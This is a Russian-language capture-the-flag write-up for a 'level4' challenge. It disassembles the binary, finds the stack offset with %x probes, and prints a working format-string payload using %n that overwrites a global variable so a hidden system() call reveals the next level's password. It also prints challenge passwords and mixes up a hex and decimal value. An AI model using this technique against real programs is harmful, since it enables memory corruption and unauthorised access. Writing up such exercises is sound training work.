## HowTo

```
su level4
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

### Инструменты:
- Ida Pro + hex rays
- peda (gdb + patterns)
- ltrace

**NB:** Для работы с файлом стягиваем его на локальную машину


### Анализ и ход решения

1. Базовый анализ
```
> gdb ./level4
> disass main
   0x080484a7 <+0>:	push   ebp
   0x080484a8 <+1>:	mov    ebp,esp
   0x080484aa <+3>:	and    esp,0xfffffff0
   0x080484ad <+6>:	call   0x8048457 <n>     <------- вызывается функция n()
   0x080484b2 <+11>:	leave  
   0x080484b3 <+12>:	ret    

> disass n
...
   0x08048488 <+49>:	call   0x8048444 <p>     <------- вызывается функция p()
...
   0x0804848d <+54>:	mov    eax,ds:0x8049810  <------- помещает значение в адрес 
   0x08048492 <+59>:	cmp    eax,0x1025544	 <------- сравнивает значение по адресу с заданным
...
   0x080484a0 <+73>:	call   0x8048360 <system@plt>	 <------- интересующий нас системный вызов 


> disass p
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:	mov    DWORD PTR [esp],eax
   0x08048450 <+12>:	call   0x8048340 <printf@plt>     <------- вызывается printf()
   0x08048455 <+17>:	leave  
   0x08048456 <+18>:	ret 

```

2. С помощью Ida Pro получаем си-псевдокод `n()`
```
int n()
{
  int result; // eax
  char s; // [esp+10h] [ebp-208h]

  fgets(&s, 512, stdin);
  p(&s);
  result = m;
  if ( m == 16930116 )
    result = system("/bin/cat /home/user/level5/.pass");
  return result;
```

3. Общая логика исполнения:
- Из мейна вызывается функция `n()`, внутри которой вызывается `p()`, подключающая `printf()`
- В `n()` после вызова `p()` проверяется значение переменной `m` и сравнивается с заданным значением 
`hex: 0x16930116, dem: 16930116)`
- Наша задача подложить в `m` нужное значение, чтобы проверка `0x08048492 <+59>` в `n()` прошла успешно

4. Идея взлома - использовать модификатор `%n printf`, который имеет уязвимость и позволяет запускать произвольный код
5. Нам нужно найти в какой но счету аргумент `printf()` помещает значение, переданное при запуске 
6. Проводим эксперименты, чтобы посмотреть какой из аргументов будет отличаться при разном инпуте
```
> python -c 'print "aaaa" + "%x " * 15' - | ./level4
aaaab7ff26b0 bffff684 b7fd0ff4 0 0 bffff648 804848d bffff440 200 b7fd1ac0 b7ff37d0 61616161 25207825 78252078 20782520 

> python -c 'print "bbbb" + "%x " * 15' - | ./level4
bbbbb7ff26b0 bffff684 b7fd0ff4 0 0 bffff648 804848d bffff440 200 b7fd1ac0 b7ff37d0 62626262 25207825 78252078 20782520 
```

Находим отличие в `12-м` агрумента `(61616161 | 62626262)`

7. Нам нужно подложить нужное значение в адрес перемнной `m`
- нас интересует адрес `0x8049810 (mov eax,ds:0x8049810)`
```
> python 0x8049810.to_bytes(4, 'little')
b'\x10\x98\x04\x08'
```

- целевое значение, которое мы должны положить - `16930112 (cmp    eax,0x1025544)` - `4` байта на адрес
- используем пейлоад со спецификатором `%n` для исполнения и `%d` для динамического определения размера

7) Готовим пейлоад и запускаем
```
> python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' - | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```